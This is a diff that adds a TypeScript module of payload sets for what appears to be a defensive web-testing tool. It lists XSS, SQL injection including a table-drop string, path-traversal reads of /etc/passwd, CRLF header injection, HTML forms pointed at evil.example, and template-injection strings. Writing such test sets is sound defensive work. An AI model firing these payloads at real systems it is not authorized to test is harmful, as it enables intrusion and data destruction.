@@ -1,0 +1,111 @@
+/**
+ * Built-in attack payload sets for `payloadDriver`. Intended for
+ * authorized security testing against your own apps — chaosbringer is
+ * a defensive testing tool, not an exploitation framework. Payloads
+ * are intentionally tame: enough signal to trigger detection-style
+ * invariants (`window.__xss_flag = 1` markers, 500 error invariants,
+ * unhandled-promise-rejection invariants), not full exploits.
+ *
+ * Pair payload sets with invariants that detect the attack class:
+ *   - XSS: invariant that fails if `window.__xss_fired` is truthy after
+ *     a chaos action. Pages that correctly escape never set it.
+ *   - SQLi: invariant that flags any 5xx response from the API layer
+ *     during the chaos action.
+ *   - Path-traversal: invariant on response body containing
+ *     `/etc/passwd`-like markers.
+ *
+ * Adding a payload set: keep it short. The driver runs many times per
+ * page; large sets dilute coverage without raising signal.
+ */
+
+export type PayloadSetName =
+  | "xss"
+  | "sqli"
+  | "path-traversal"
+  | "large"
+  | "unicode"
+  | "html"
+  | "template-injection";
+
+export const XSS_PAYLOADS: ReadonlyArray<string> = [
+  "<script>window.__xss_fired=1</script>",
+  '"><script>window.__xss_fired=1</script>',
+  "<img src=x onerror=window.__xss_fired=1>",
+  "<svg/onload=window.__xss_fired=1>",
+  "javascript:window.__xss_fired=1",
+  "'\"--></style></script><script>window.__xss_fired=1</script>",
+  "<iframe src=\"javascript:window.__xss_fired=1\"></iframe>",
+];
+
+export const SQLI_PAYLOADS: ReadonlyArray<string> = [
+  "' OR '1'='1",
+  "' OR 1=1 --",
+  '" OR ""="',
+  "'; DROP TABLE users; --",
+  "1' UNION SELECT NULL--",
+  "admin'--",
+  "%27",
+];
+
+export const PATH_TRAVERSAL_PAYLOADS: ReadonlyArray<string> = [
+  "../../../../etc/passwd",
+  "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+  "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+  "....//....//etc/passwd",
+  "/etc/passwd%00",
+  "file:///etc/passwd",
+];
+
+export const LARGE_PAYLOADS: ReadonlyArray<string> = [
+  "A".repeat(1024),
+  "A".repeat(16384),
+  "A".repeat(65536),
+  "💥".repeat(2048),
+  "\0".repeat(256),
+];
+
+export const UNICODE_PAYLOADS: ReadonlyArray<string> = [
+  "Ｓｅｌｅｃｔ", // fullwidth
+  "‮evil", // right-to-left override
+  "﻿hidden",
+  "𝕊𝕖𝕝𝕖𝕔𝕥", // mathematical alphanumeric
+  "İstanbul", // dotted-I unicode case folding edge
+  "test\r\nSet-Cookie: pwned=1", // CRLF injection
+  "test\0null",
+];
+
+export const HTML_INJECTION_PAYLOADS: ReadonlyArray<string> = [
+  "<h1>injected</h1>",
+  "<a href=\"https://evil.example\">click</a>",
+  "<form action=\"https://evil.example\"><input name=x></form>",
+  "<style>body{display:none}</style>",
+];
+
+export const TEMPLATE_INJECTION_PAYLOADS: ReadonlyArray<string> = [
+  "{{7*7}}",
+  "${7*7}",
+  "<%= 7*7 %>",
+  "#{7*7}",
+  "{{constructor.constructor('return process')()}}",
+];
+
+export const DEFAULT_PAYLOAD_SETS: Record<PayloadSetName, ReadonlyArray<string>> = {
+  xss: XSS_PAYLOADS,
+  sqli: SQLI_PAYLOADS,
+  "path-traversal": PATH_TRAVERSAL_PAYLOADS,
+  large: LARGE_PAYLOADS,
+  unicode: UNICODE_PAYLOADS,
+  html: HTML_INJECTION_PAYLOADS,
+  "template-injection": TEMPLATE_INJECTION_PAYLOADS,
+};
+
+/** Combine multiple named sets into one flat payload list. */
+export function combinePayloadSets(
+  names: ReadonlyArray<PayloadSetName>,
+): ReadonlyArray<string> {
+  const out: string[] = [];
+  for (const n of names) {
+    for (const p of DEFAULT_PAYLOAD_SETS[n]) out.push(p);
+  }
+  return out;
+}
